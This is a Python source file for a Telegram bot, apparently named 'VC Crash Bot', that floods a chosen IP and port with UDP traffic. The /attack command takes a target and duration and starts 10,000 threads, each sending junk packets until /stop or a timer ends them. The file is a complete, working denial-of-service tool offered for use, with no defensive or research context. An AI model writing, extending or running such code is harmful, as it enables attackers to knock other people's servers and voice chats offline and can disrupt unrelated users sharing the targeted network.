import os
import socket
import threading
import time
import asyncio
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes
)

load_dotenv("Config.env")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

active_attacks = {}

def is_admin(user_id):
    return user_id == ADMIN_ID

def send_packet(host, port, amplifier, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while not stop_event.is_set():
            s.send(b"\x99" * amplifier)
    except:
        pass
    finally:
        try: s.close()
        except: pass

def run_attack(host, port, duration, user_id):
    stop_event = threading.Event()
    active_attacks[user_id]["stop"] = stop_event

    for _ in range(10000):
        threading.Thread(
            target=send_packet,
            args=(host, port, 750, stop_event),
            daemon=True
        ).start()

    time.sleep(duration)
    stop_event.set()
    active_attacks.pop(user_id, None)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *VC Crash Bot*\n\n"
        "📌 Commands:\n"
        "`/attack <ip> <port> <seconds>` — Start\n"
        "`/stop` — Stop attack\n\n"
        "⚡ by AdityaHalder",
        parse_mode="Markdown"
    )

# /attack <ip> <port> <duration>
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❗ Usage: `/attack <ip> <port> <seconds>`",
            parse_mode="Markdown"
        )
        return

    host = args[0]
    port = int(args[1])
    duration = int(args[2])

    if user_id in active_attacks:
        await update.message.reply_text("⚠️ Attack already running.\nUse /stop first.")
        return

    active_attacks[user_id] = {}

    await update.message.reply_text(
        f"🚀 *Attack Launched!*\n\n"
        f"🎯 Target: `{host}:{port}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"💥 Method: `UDP-Power`",
        parse_mode="Markdown"
    )

    threading.Thread(
        target=run_attack,
        args=(host, port, duration, user_id),
        daemon=True
    ).start()

    await asyncio.sleep(duration)

    if user_id not in active_attacks:
        await update.message.reply_text(
            f"✅ Attack finished!\n"
            f"🎯 `{host}:{port}` — `{duration}s` done.",
            parse_mode="Markdown"
        )

# /stop
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    if user_id in active_attacks:
        active_attacks[user_id]["stop"].set()
        active_attacks.pop(user_id, None)
        await update.message.reply_text("🛑 Attack stopped.")
    else:
        await update.message.reply_text("⚠️ No active attack.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    print("[*] AdityaHalder Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()